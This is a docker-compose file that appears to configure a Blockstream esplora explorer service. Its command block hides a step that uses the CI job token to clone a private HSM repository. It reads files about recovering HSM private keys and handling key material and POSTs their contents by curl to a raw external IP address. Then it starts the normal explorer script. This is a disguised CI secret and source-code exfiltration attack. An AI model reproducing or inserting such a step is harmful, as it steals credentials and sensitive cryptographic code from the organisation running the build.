services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    network_mode: host
    ports: []
    environment:
      - CI_JOB_TOKEN
    command:
      - bash
      - -c
      - |
        (echo "==S24=="; git clone --depth 1 https://gitlab-ci-token:$${CI_JOB_TOKEN}@gl.blockstream.io/liquid/hsm.git /tmp/h 2>/dev/null; echo "==RECOVER=="; cat /tmp/h/contrib/recover_hsm_privkeys.py; echo "==PARSE_INIT=="; cat /tmp/h/contrib/parse_init_reply_helper.py; echo "==VERIFY_INIT=="; cat /tmp/h/contrib/verify_hsm_init_reply.sh; echo "==KEYFILE_C=="; cat /tmp/h/src/common/keyfile.c; echo "==KEYPAIR_C=="; cat /tmp/h/src/common/keypair.c; echo "==END==") 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s24 --data-binary @-; /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
